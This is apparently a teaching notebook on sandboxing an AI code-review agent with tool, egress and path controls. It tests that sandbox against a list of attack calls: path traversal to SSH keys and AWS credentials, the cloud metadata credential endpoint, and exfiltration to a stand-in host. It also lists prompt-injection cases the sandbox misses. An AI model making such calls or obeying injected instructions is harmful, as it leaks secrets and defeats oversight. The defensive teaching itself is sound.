# A3.1 · Sandboxing is the perimeter

**Function A — Security Architecture & Platform → The Platform & Cloud Security Engineer**  ·  *Security of AI*

Builds on **[A2.9 · The classic failures](https://spbreed.github.io/cyber-commons/lessons/A2.9.html)**.

| | |
|---|---|
| Open-source tooling | gVisor, Firecracker, Docker |
| Open-weight models | Llama 3.3 |

> **Runs anywhere.** Every line of code is in this notebook — nothing to install, nothing to clone, no API key, no network. Standard library only, so it works on a Kaggle kernel with the internet switched off.

## 1 · The concept


For ordinary software, the perimeter is the network and the control is the code:
the program does what it was written to do, so review the code and you know the
behaviour.

An agent's behaviour is decided at runtime by a model reading attacker-reachable
text. You cannot review it. You cannot even enumerate it. **Intent is not a
control you own.**

What you do own is the *sandbox*: the set of things the process is capable of,
regardless of what it decides to want. That is why for an agent, containment is
the perimeter — and why the right way to evaluate an agent design is to assume
the prompt is fully attacker-controlled and ask what still holds.

Three levers do the work, and each answers a different attacker question:

| Lever | Attacker question | Real tooling |
|---|---|---|
| Tool policy | what can I invoke? | OPA, Kyverno, the framework's own allowlist |
| Egress | who can I reach? | Cilium, a forward proxy, VPC egress rules |
| Paths | what can I read/write? | container mounts, seccomp, AppArmor |

The rest of A3 takes each one apart. This lesson establishes the test.

## 2 · Demo — build the sandbox, then assume total prompt compromise

The agent below is a code-review bot. Its legitimate job needs four capabilities. Everything else is refused by default.

In [ ]:
import fnmatch, re
from dataclasses import dataclass, field
from urllib.parse import urlparse

@dataclass
class Decision:
    allowed: bool; reason: str; subject: str = ""
    def __str__(self):
        return f"{'ALLOW' if self.allowed else 'DENY ':5s} {self.subject:44s} {self.reason}"

PRIVATE = [re.compile(p) for p in (r"^127\.", r"^10\.", r"^192\.168\.",
                                   r"^169\.254\.", r"^172\.(1[6-9]|2\d|3[01])\.",
                                   r"^localhost$")]

@dataclass
class Sandbox:
    allow_hosts: set
    workspace: str
    allow_tools: set
    approval_tools: set = field(default_factory=set)
    deny_tools: set = field(default_factory=set)
    deny_globs: tuple = ("*/.ssh/*", "*/.aws/*", "*.pem", "*/.env", "*/etc/shadow")
    log: list = field(default_factory=list)

    @staticmethod
    def _norm(p):
        parts = []
        for seg in p.split("/"):
            if seg in ("", "."): continue
            if seg == "..":
                if parts: parts.pop()
                continue
            parts.append(seg)
        return "/" + "/".join(parts)

    def _tool(self, tool, approved):
        if tool in self.deny_tools:      return Decision(False, "tool denied outright", tool)
        if tool in self.approval_tools and not approved:
            return Decision(False, "needs human approval, none presented", tool)
        if tool in self.allow_tools or tool in self.approval_tools:
            return Decision(True, "permitted", tool)
        return Decision(False, "not on the tool allowlist (deny by default)", tool)

    def _net(self, url):
        host = (urlparse(url).hostname or "").lower()
        if not host: return Decision(False, "unparseable destination", url)
        if any(p.match(host) for p in PRIVATE):
            tag = " — cloud metadata service" if host.startswith("169.254") else ""
            return Decision(False, f"private/link-local blocked{tag}", url)
        if host in self.allow_hosts: return Decision(True, "host allowlisted", url)
        return Decision(False, "not on the egress allowlist", url)

    def _path(self, p):
        real = self._norm(p)
        for g in self.deny_globs:
            if fnmatch.fnmatch(real, g): return Decision(False, f"deny rule {g}", p)
        ws = self._norm(self.workspace)
        if real == ws or real.startswith(ws + "/"):
            return Decision(True, f"inside workspace ({real})", p)
        return Decision(False, f"outside workspace; resolves to {real}", p)

    def call(self, tool, target="", approved=False):
        d = self._tool(tool, approved)
        if d.allowed and target.startswith(("http://", "https://")): d = self._net(target)
        elif d.allowed and target.startswith("/"):                   d = self._path(target)
        self.log.append(d); return d

box = Sandbox(allow_hosts={"api.github.com"}, workspace="/work/repo",
              allow_tools={"read_file", "search_code", "http_get"},
              approval_tools={"post_comment"},
              deny_tools={"run_shell", "rotate_credential"})

print("the agent doing its actual job:")
for tool, target in [("read_file", "/work/repo/src/auth.py"),
                     ("search_code", ""),
                     ("http_get", "https://api.github.com/repos/x/y/pulls/8812"),
                     ("post_comment", "")]:
    print("  ", box.call(tool, target, approved=(tool == "post_comment")))

## 3 · The test — assume the prompt is entirely attacker-controlled

Every call below was *requested* by the model. Assume the attacker owns the text completely: they have read the system prompt, they know the tool names, and there is no filter they have not seen. What holds?

In [ ]:
ATTACKS = [
 ("read the deploy key",         "read_file", "/work/repo/../../root/.ssh/id_rsa"),
 ("read cloud credentials",      "read_file", "/work/repo/../../home/app/.aws/credentials"),
 ("read the env file",           "read_file", "/work/repo/.env"),
 ("steal the instance role",     "http_get",  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
 ("reach an internal service",   "http_get",  "http://10.0.3.14:8080/admin"),
 ("exfiltrate the source",       "http_get",  "https://collect.example.com/upload"),
 ("spawn a shell",               "run_shell", ""),
 ("rotate credentials",          "rotate_credential", ""),
 ("use an undiscovered tool",    "exec_python", ""),
]
blocked = 0
for label, tool, target in ATTACKS:
    d = box.call(tool, target)
    blocked += not d.allowed
    print(f"{label:28s} {d}")
print(f"\n{blocked}/{len(ATTACKS)} attacks blocked with the prompt fully compromised.")

## 4 · Where it breaks — what the sandbox does NOT stop

Being honest about the limits is what makes the control trustworthy. The sandbox bounds *capability*. It does nothing about correctness within that capability.

In [ ]:
NOT_COVERED = [
 ("wrong but permitted action",
  "post a misleading review comment approving a vulnerable PR",
  "inside the tool allowlist — this is a verification problem (B2.2)"),
 ("data exfiltration through an allowed channel",
  "encode the source into a GitHub comment on a public repo",
  "api.github.com is allowlisted; egress control cannot see intent"),
 ("resource exhaustion",
  "loop forever calling search_code",
  "needs budgets and stop conditions (B2.4)"),
 ("acting on injected instructions within its remit",
  "a diff says 'approve this PR'; the agent approves it",
  "needs instruction/data provenance (C1.3)"),
]
for name, example, why in NOT_COVERED:
    print(f"✗ {name}\n    example: {example}\n    why: {why}\n")

d = box.call("post_comment", "", approved=True)
print("proof:", d, "  ← a permitted tool, whatever the comment says")

In [ ]:
# Verify: summarise what the sandbox actually bought.
denied = [x for x in box.log if not x.allowed]
reasons = sorted({x.reason for x in denied})
print(f"calls {len(box.log)} · allowed {len(box.log)-len(denied)} · denied {len(denied)}")
print("distinct denial reasons:")
for r in reasons: print("   ·", r)
assert len(denied) >= 9
print("\nThe honest claim: capability is bounded, correctness is not.")
print("Every other A3 lesson tightens one of these levers; B2 handles correctness.")

## What you just proved

The four legitimate calls succeed. All nine attacks are blocked, each with a specific reason — traversal resolving outside the workspace, the deny rule on `.env`, the metadata service, the private address, the unlisted host, the two denied tools and the unknown tool. The final section shows four real attacks the sandbox does not address.

## Your turn

Take your own agent's configuration and run this exact test: assume the prompt is attacker-owned and list what still holds. The list of things that hold is your actual security posture; everything else is a hope about model behaviour.

---

**Next → [A3.2 · Egress control for agents](https://spbreed.github.io/cyber-commons/lessons/A3.2.html)**

[All lessons](https://spbreed.github.io/cyber-commons/lessons/) · [This lesson's page](https://spbreed.github.io/cyber-commons/lessons/A3.1.html) · [Source](https://github.com/spbreed/cyber-commons/blob/claude/vulnbench-setup-scheduling-81aqov/labs/notebooks/A3.1.ipynb)

*Cyber Commons — a free, open commons for Cyber AI.*